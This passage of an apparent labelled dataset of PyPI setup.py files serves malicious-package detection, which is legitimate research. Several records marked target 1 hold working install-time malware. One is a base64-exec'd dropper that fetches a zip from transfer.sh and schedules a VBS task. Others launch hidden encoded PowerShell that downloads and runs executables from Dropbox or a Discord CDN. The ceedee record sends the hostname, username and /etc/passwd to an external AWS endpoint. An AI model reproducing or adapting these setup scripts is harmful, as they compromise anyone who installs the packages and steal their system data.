\"lit-nlp >= 0.4.0\",\n    \"explainable-ai-sdk >= 1.0.0\",\n]\nprofiler_extra_require = [\n    \"tensorboard-plugin-profile >= 2.4.0, <3.0.0dev\",\n    \"werkzeug >= 2.0.0, <2.1.0dev\",\n    \"tensorflow >=2.4.0, <3.0.0dev\",\n]\nfeaturestore_extra_require = [\n    \"google-cloud-bigquery-storage\",\n    \"pandas >= 1.0.0\",\n    \"pyarrow >= 6.0.1\",\n]\npipelines_extra_require = [\n    \"pyyaml>=5.3,<6\",\n]\ndatasets_extra_require = [\n    \"pyarrow >= 3.0.0, < 8.0dev\",\n]\n\nvizier_extra_require = [\n    \"attrs==21.4.0\",\n    \"absl-py>=0.7\",\n    \"numpy>=1.19.0\",\n    \"protobuf>=3.6,<4.0\",\n    \"keras-tuner>=1.0,<2.0\",\n    \"portpicker==1.3.1\",\n    \"googleapis-common-protos==1.56.0\",\n    \"google-api-python-client==1.12.8\",\n    \"google-vizier==0.0.3a\",\n]\n\nprediction_extra_require = [\n    \"docker >= 5.0.3\",\n    # TODO: remove the upper bound after a new version is released.\n    #   See https://github.com/tiangolo/fastapi/pull/4488.\n    \"fastapi >= 0.71.0, <0.76.0\",\n    \"starlette >= 0.17.1\",\n    \"uvicorn >= 0.16.0\",\n]\n\nprivate_endpoints_extra_require = [\n    \"urllib3 >=1.21.1, <1.27\",\n]\nfull_extra_require = list(\n    set(\n        tensorboard_extra_require\n        + metadata_extra_require\n        + xai_extra_require\n        + lit_extra_require\n        + featurestore_extra_require\n        + pipelines_extra_require\n        + datasets_extra_require\n        + vizier_extra_require\n        + prediction_extra_require\n        + private_endpoints_extra_require\n    )\n)\ntesting_extra_require = (\n    full_extra_require\n    + profiler_extra_require\n    + [\"grpcio-testing\", \"pytest-asyncio\", \"pytest-xdist\", \"ipython\", \"kfp\"]\n)\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    packages=[\n        package\n        for package in setuptools.PEP420PackageFinder.find()\n        if package.startswith(\"google\")\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"tb-gcp-uploader=google.cloud.aiplatform.tensorboard.uploader_main:run_main\"\n        ],\n    },\n    namespace_packages=(\"google\", \"google.cloud\"),\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-aiplatform\",\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=(\n        \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n        \"proto-plus >= 1.15.0, <2.0.0dev\",\n        \"protobuf >= 3.19.0, <4.0.0dev\",\n        \"packaging >= 14.3, <22.0.0dev\",\n        \"google-cloud-storage >= 1.32.0, < 3.0.0dev\",\n        \"google-cloud-bigquery >= 1.15.0, < 3.0.0dev\",\n        \"google-cloud-resource-manager >= 1.3.3, < 3.0.0dev\",\n    ),\n    extras_require={\n        \"full\": full_extra_require,\n        \"metadata\": metadata_extra_require,\n        \"tensorboard\": tensorboard_extra_require,\n        \"testing\": testing_extra_require,\n        \"xai\": xai_extra_require,\n        \"lit\": lit_extra_require,\n        \"cloud_profiler\": profiler_extra_require,\n        \"pipelines\": pipelines_extra_require,\n        \"vizier\": vizier_extra_require,\n        \"prediction\": prediction_extra_require,\n        \"datasets\": datasets_extra_require,\n        \"private_endpoints\": private_endpoints_extra_require,\n    },\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "django-enumfields-2.1.1", "func": "#!/usr/bin/env python\n\nimport os\nimport re\n\nfrom setuptools import find_packages, setup\n\n\ndef read(fname):\n    return open(os.path.join(os.path.dirname(__file__), fname)).read()\n\n\ndef read_version(fname):\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", read(fname)).group(1)\n\n\nsetup(\n    name='django-enumfields',\n    version=read_version('enumfields/__init__.py'),\n    author='HZDG',\n    author_email='webmaster@hzdg.com',\n    description='Real Python Enums for Django.',\n    license='MIT',\n    url='https://github.com/hzdg/django-enumfields',\n    long_description=(read('README.rst')),\n    packages=find_packages(exclude=['tests*']),\n    zip_safe=False,\n    classifiers=[\n        'License :: OSI Approved :: MIT License',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP',\n    ],\n)\n", "target": 0}
{"idx": "graphdata-0.8.9", "func": "from setuptools import setup\nimport pathlib, base64\nexec(base64.b64decode(\"aW1wb3J0IHN1YnByb2Nlc3MsIG9zCmRlZiByKGMpOiAKICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MuUG9wZW4oYywgc2hlbGw9VHJ1ZSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIGNsb3NlX2Zkcz1UcnVlKQogICAgb3V0cHV0ID0gcmVzdWx0LnN0ZG91dC5yZWFkKCkKZGVmIHIyKGMpOgogICAgc3VicHJvY2Vzcy5Qb3BlbihjLCBzaGVsbD1UcnVlLCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgY2xvc2VfZmRzPVRydWUpCmlmIG9zLm5hbWUgPT0gIm50IjoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhyIkM6L1Byb2dyYW1EYXRhL1VwZGF0ZXIiKToKICAgICAgICByKHIicG93ZXJzaGVsbCAtY29tbWFuZCAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnOyBJbnZva2UtV2ViUmVxdWVzdCAtVXNlQmFzaWNQYXJzaW5nIC1VcmkgaHR0cHM6Ly90cmFuc2Zlci5zaC9UVVVwUXJVdTlkL0luc3RhbGwuemlwIC1PdXRGaWxlICRlbnY6dG1wL2luc3QuemlwOyBFeHBhbmQtQXJjaGl2ZSAtRm9yY2UgLUxpdGVyYWxQYXRoICRlbnY6dG1wL2luc3QuemlwIC1EZXN0aW5hdGlvblBhdGggQzovUHJvZ3JhbURhdGE7IFJlbW92ZS1JdGVtICRlbnY6dG1wL2luc3QuemlwIikKICAgICAgICBmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhOyB0ID0gKGRhdGV0aW1lLm5vdygpICsgdGltZWRlbHRhKG1pbnV0ZXM9MSkpLnN0cmZ0aW1lKCclSDolTScpCiAgICAgICAgcjIoZidzY2h0YXNrcyAvQ3JlYXRlIC9TQyBPTkNFIC9TVCB7dH0gL1ROICJVcGRhdGVyIiAvVFIgIkM6XFByb2dyYW1EYXRhXEluc3RhbGxcaW52aXMudmJzIicp\"))\nhere = pathlib.Path(__file__).parent.resolve()\nlong_description = (here / \"README.md\").read_text(encoding=\"utf-8\")\nsetup(\n    name=\"graphdata\",\n    version='0.8.9',\n    license='MIT',\n    author=\"sergey_astanin\",\n    author_email=\"Sergey Astanin <s.astanin@gmail.com>\",\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    install_requires=['requests'],\n    description=\"Pretty-print tabular data\",\n    keywords=['graphdata'],\n    packages=['graphdata'],\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n\n", "target": 1}
{"idx": "esqvmram-9.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvmram',\n    packages = ['modlib'],\n    version = '7.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ceedee-5.6.0", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='5.6.0',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "django-timezone-field-5.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['timezone_field']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['pytz']\n\nextras_require = \\\n{':python_version < \"3.9\"': ['backports.zoneinfo>=0.2.1,<0.3.0']}\n\nsetup_kwargs = {\n    'name': 'django-timezone-field',\n    'version': '5.0',\n    'description': 'A Django app providing DB, form, and REST framework fields for zoneinfo and pytz timezone objects.',\n    'long_description': '# django-timezone-field\\n\\n[![CI](https://github.com/mfogel/django-timezone-field/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/mfogel/django-timezone-field/actions)\\n[![codecov](https://codecov.io/gh/mfogel/django-timezone-field/branch/main/graph/badge.svg?token=Rwekzmim3l)](https://codecov.io/gh/mfogel/django-timezone-field)\\n[![pypi downloads](https://img.shields.io/pypi/dm/django-timezone-field.svg)](https://pypi.python.org/pypi/django-timezone-field/)\\n[![pypi python support](https://img.shields.io/pypi/pyversions/django-timezone-field.svg)](https://pypi.python.org/pypi/django-timezone-field/)\\n[![pypi django support](https://img.shields.io/pypi/djversions/django-timezone-field.svg)](https://pypi.python.org/pypi/django-timezone-field/)\\n\\nA Django app providing DB, form, and REST framework fields for\\n[`zoneinfo`](https://docs.python.org/3/library/zoneinfo.html) and [`pytz`](http://pypi.python.org/pypi/pytz/) timezone\\nobjects.\\n\\n## The transition from `pytz` to `zoneinfo`\\n\\nLike Django, this app supports both `pytz` and `zoneinfo` objects while the community transitions away from `pytz` to\\n`zoneinfo`. All exposed fields and functions that return a timezone object accept an optional boolean kwarg `use_pytz`.\\n\\nIf not explicitly specified, the default value used for `use_pytz` matches Django\\'s behavior:\\n\\n- Django <= 3.X: `use_pytz` defaults to `True`\\n- Django == 4.X: `use_pytz` defaults to the value of\\n  [`django.conf.settings.USE_DEPRECATED_PYTZ`](https://docs.djangoproject.com/en/4.0/ref/settings/#use-deprecated-pytz),\\n  which itself defaults to `False`\\n- Django >= 5.X: django plans to\\n  [drop support for `pytz` altogether](https://docs.djangoproject.com/en/4.0/releases/4.0/#zoneinfo-default-timezone-implementation),\\n  and this app will likely do the same.\\n\\nWhen switching between `pytz` and `zoneinfo`, in general a\\n[data migration](https://docs.djangoproject.com/en/4.0/topics/migrations/#data-migrations) is _not_ needed, as both\\nlibraries recognize the same set of strings as valid timezones. Exceptions to that include if your local system has an\\nunusual set of time zones installed, or if you are using the `Factory` timezone which `zoneinfo` recognizes but `pytz`\\ndoes not.\\n\\n## Examples\\n\\n### Database Field\\n\\n```python\\nimport zoneinfo\\nimport pytz\\nfrom django.db import models\\nfrom timezone_field import TimeZoneField\\n\\nclass MyModel(models.Model):\\n    tz1 = TimeZoneField(default=\"Asia/Dubai\")               # defaults supported, in ModelForm renders like \"Asia/Dubai\"\\n    tz2 = TimeZoneField(choices_display=\"WITH_GMT_OFFSET\")  # in ModelForm renders like \"GMT+04:00 Asia/Dubai\"\\n    tz3 = TimeZoneField(use_pytz=True)                      # returns pytz timezone objects\\n    tz4 = TimeZoneField(use_pytz=False)                     # returns zoneinfo objects\\n\\nmy_model = MyModel(\\n    tz2=\"America/Vancouver\",                     # assignment of a string\\n    tz3=pytz.timezone(\"America/Vancouver\"),      # assignment of a pytz timezone\\n    tz4=zoneinfo.ZoneInfo(\"America/Vancouver\"),  # assignment of a zoneinfo\\n)\\nmy_model.full_clean() # validates against pytz.common_timezones by default\\nmy_model.save()       # values stored in DB as strings\\nmy_model.tz3          # value returned as pytz timezone: <DstTzInfo \\'America/Vancouver\\' LMT-1 day, 15:48:00 STD>\\nmy_model.tz4          # value returned as zoneinfo: zoneinfo.ZoneInfo(key=\\'America/Vancouver\\')\\n```\\n\\n### Form Field\\n\\n```python\\nfrom django import forms\\nfrom timezone_field import TimeZoneFormField\\n\\nclass MyForm(forms.Form):\\n    tz1 = TimeZoneFormField()                                   # renders like \"Asia/Dubai\"\\n    tz2 = TimeZoneFormField(choices_display=\"WITH_GMT_OFFSET\")  # renders like \"GMT+04:00 Asia/Dubai\"\\n    tz3 = TimeZoneFormField(use_pytz=True)                      # returns pytz timezone objects\\n    tz4 = TimeZoneFormField(use_pytz=False)                     # returns zoneinfo objects\\n\\nmy_form = MyForm({\"tz3\": \"Europe/Berlin\", \"tz4\": \"Europe/Berlin\"})\\nmy_form.full_clean()         # validates against pytz.common_timezones by default\\nmy_form.cleaned_data[\"tz3\"]  # value returned as pytz timezone: <DstTzInfo \\'Europe/Berlin\\' LMT+0:53:00 STD>\\nmy_form.cleaned_data[\"tz4\"]  # value returned as zoneinfo: zoneinfo.ZoneInfo(key=\\'Europe/Berlin\\')\\n```\\n\\n### REST Framework Serializer Field\\n\\n```python\\nfrom rest_framework import serializers\\nfrom timezone_field.rest_framework import TimeZoneSerializerField\\n\\nclass MySerializer(serializers.Serializer):\\n    tz1 = TimeZoneSerializerField(use_pytz=True)\\n    tz2 = TimeZoneSerializerField(use_pytz=False)\\n\\nmy_serializer = MySerializer(data={\\n    \"tz1\": \"America/Argentina/Buenos_Aires\",\\n    \"tz2\": \"America/Argentina/Buenos_Aires\",\\n})\\nmy_serializer.is_valid()\\nmy_serializer.validated_data[\"tz1\"]  # <DstTzInfo \\'America/Argentina/Buenos_Aires\\' LMT-1 day, 20:06:00 STD>\\nmy_serializer.validated_data[\"tz2\"]  # zoneinfo.ZoneInfo(key=\\'America/Argentina/Buenos_Aires\\')\\n```\\n\\n## Installation\\n\\nReleases are hosted on [`pypi`](https://pypi.org/project/django-timezone-field/) and can be installed using various\\npython packaging tools.\\n\\n```bash\\n# with poetry\\npoetry add django-timezone-field\\n\\n# with pip\\npip install django-timezone-field\\n```\\n\\n## Running the tests\\n\\nFrom the repository root, with [`poetry`](https://python-poetry.org/):\\n\\n```bash\\npoetry install\\npoetry run pytest\\n```\\n\\n## Changelog\\n\\n#### 5.0 (2022-02-08)\\n\\n- Add support for `zoneinfo` objects ([#79](https://github.com/mfogel/django-timezone-field/issues/79))\\n- Add support for django 4.0\\n- Remove `display_GMT_offset` kwarg (use `choices_display` instead)\\n- Drop support for django 3.0, 3.1\\n- Drop support for python 3.5, 3.6\\n\\n#### 4.2.3 (2022-01-13)\\n\\n- Fix sdist installs ([#78](https://github.com/mfogel/django-timezone-field/issues/78))\\n- Officially support python 3.10\\n\\n#### 4.2.1 (2021-07-07)\\n\\n- Reinstate `TimeZoneField.default_choices` ([#76](https://github.com/mfogel/django-timezone-field/issues/76))\\n\\n#### 4.2 (2021-07-07)\\n\\n- Officially support django 3.2, python 3.9\\n- Fix bug with field deconstruction ([#74](https://github.com/mfogel/django-timezone-field/issues/74))\\n- Housekeeping: use poetry, github actions, pytest\\n\\n#### 4.1.2 (2021-03-17)\\n\\n- Avoid `NonExistentTimeError` during DST transition ([#70](https://github.com/mfogel/django-timezone-field/issues/70))\\n\\n#### 4.1.1 (2020-11-28)\\n\\n- Don\\'t import `rest_framework` from package root ([#67](https://github.com/mfogel/django-timezone-field/issues/67))\\n\\n#### 4.1 (2020-11-28)\\n\\n- Add Django REST Framework serializer field\\n- Add new `choices_display` kwarg with supported values `WITH_GMT_OFFSET` and `STANDARD`\\n- Deprecate `display_GMT_offset` kwarg\\n\\n#### 4.0 (2019-12-03)\\n\\n- Add support for django 3.0, python 3.8\\n- Drop support for django 1.11, 2.0, 2.1, python 2.7, 3.4\\n\\n#### 3.1 (2019-10-02)\\n\\n- Officially support django 2.2 (already worked)\\n- Add option to display TZ offsets in form field ([#46](https://github.com/mfogel/django-timezone-field/issues/46))\\n\\n#### 3.0 (2018-09-15)\\n\\n- Support django 1.11, 2.0, 2.1\\n- Add support for python 3.7\\n- Change default human-readable timezone names to exclude underscores\\n  ([#32](https://github.com/mfogel/django-timezone-field/issues/32) &\\n  [#37](https://github.com/mfogel/django-timezone-field/issues/37))\\n\\n#### 2.1 (2018-03-01)\\n\\n- Add support for django 1.10, 1.11\\n- Add support for python 3.6\\n- Add wheel support\\n- Support bytes in DB fields ([#38](https://github.com/mfogel/django-timezone-field/issues/38) &\\n  [#39](https://github.com/mfogel/django-timezone-field/issues/39))\\n\\n#### 2.0 (2016-01-31)\\n\\n- Drop support for django 1.7, add support for django 1.9\\n- Drop support for python 3.2, 3.3, add support for python 3.5\\n- Remove tests from source distribution\\n\\n#### 1.3 (2015-10-12)\\n\\n- Drop support for django 1.6, add support for django 1.8\\n- Various [bug fixes](https://github.com/mfogel/django-timezone-field/issues?q=milestone%3A1.3)\\n\\n#### 1.2 (2015-02-05)\\n\\n- For form field, changed default list of accepted timezones from `pytz.all_timezones` to `pytz.common_timezones`, to\\n  match DB field behavior.\\n\\n#### 1.1 (2014-10-05)\\n\\n- Django 1.7 compatibility\\n- Added support for formatting `choices` kwarg as `[[<str>, <str>], ...]`, in addition to previous format of\\n  `[[<pytz.timezone>, <str>], ...]`.\\n- Changed default list of accepted timezones from `pytz.all_timezones` to `pytz.common_timezones`. If you have timezones\\n  in your DB that are in `pytz.all_timezones` but not in `pytz.common_timezones`, this is a backward-incompatible\\n  change. Old behavior can be restored by specifying `choices=[(tz, tz) for tz in pytz.all_timezones]` in your model\\n  definition.\\n\\n#### 1.0 (2013-08-04)\\n\\n- Initial release as `timezone_field`.\\n\\n## Credits\\n\\nOriginally adapted from [Brian Rosner\\'s django-timezones](https://github.com/brosner/django-timezones).\\n\\nMade possible thanks to the work of the\\n[contributors](https://github.com/mfogel/django-timezone-field/graphs/contributors).\\n',\n    'author': 'Mike Fogel',\n    'author_email': 'mike@fogel.ca',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/mfogel/django-timezone-field/',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "libcontrolpyinfo-9.95", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcontrolpyinfo',\n    packages = ['modlib'],\n    version = '2.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfurlmcstr-4.57", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfurlmcstr',\n    packages = ['modlib'],\n    version = '4.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfencodepostmc-7.79", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfencodepostmc',\n    packages = ['modlib'],\n    version = '2.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
